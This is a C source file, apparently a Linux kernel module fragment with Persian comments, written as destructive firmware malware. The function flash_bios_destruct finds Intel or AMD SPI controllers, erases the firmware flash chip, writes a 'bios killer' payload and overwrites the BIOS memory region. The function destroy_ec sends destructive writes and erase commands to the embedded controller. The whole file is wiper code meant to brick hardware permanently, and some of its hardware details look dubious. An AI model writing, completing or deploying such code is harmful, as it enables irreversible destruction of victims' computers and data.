#include <linux/pci.h>
#include <linux/ioport.h>
#include <linux/io.h>
#include "spi_flash.h"
#include "phoenix_defs.h"

// بازنویسی مستقیم فلش SPI فرم‌ور
void flash_bios_destruct(void) {
    struct pci_dev *pci_dev = pci_get_device(0x8086, 0x1f48, NULL); // Intel SPI Controller
    if (!pci_dev) pci_dev = pci_get_device(0x1022, 0x790b, NULL); // AMD SPI Controller
    
    if (pci_dev) {
        void __iomem *spi_base = pci_iomap(pci_dev, 0, 0);
        if (spi_base) {
            // فعال‌سازی برنامه‌ریزی SPI
            writeb(0x06, spi_base + SPI_OPCODE); // WREN
            
            // پاک‌سازی کامل چیپ
            writeb(0xC7, spi_base + SPI_OPCODE); // Chip Erase
            msleep(3000);
            
            // نوشتن پیلود تخریب‌گر
            const u8 *payload = get_bios_killer_payload();
            for (int i = 0; i < BIOS_KILLER_SIZE; i += 4) {
                writeb(0x02, spi_base + SPI_OPCODE); // Page Program
                writel(i, spi_base + SPI_ADDRESS);
                writel(*(u32*)(payload + i), spi_base + SPI_DATA);
                msleep(10);
            }
            
            // غیرفعال‌سازی حفاظت
            writeb(0x01, spi_base + SPI_STATUS); // Disable protection
            pci_iounmap(pci_dev, spi_base);
        }
        pci_dev_put(pci_dev);
    }
    
    // روش جایگزین: دسترسی مستقیم به حافظه فلش
    void __iomem *bios_mem = ioremap(0xFF000000, 0x1000000); // BIOS Memory Region
    if (bios_mem) {
        for (int i = 0; i < 0x1000000; i += 4) {
            writew(0xDEAD, bios_mem + i);
        }
        iounmap(bios_mem);
    }
}

// تخریب Embedded Controller
void destroy_ec(void) {
    // دسترسی به پورت‌های EC
    outb(0x66, 0x62); outb(0x62, 0x66); // Enter EC Mode
    
    // نوشتن مقادیر مخرب به رجیسترها
    for (int i = 0; i < 0xFF; i++) {
        outb(i, 0x62);
        outb(0xFF, 0x66);
    }
    
    // فلش کردن EC
    outb(0x77, 0x62); outb(0x77, 0x66); // Flash Erase
    msleep(100);
    outb(0x88, 0x62); outb(0x88, 0x66); // Commit
}
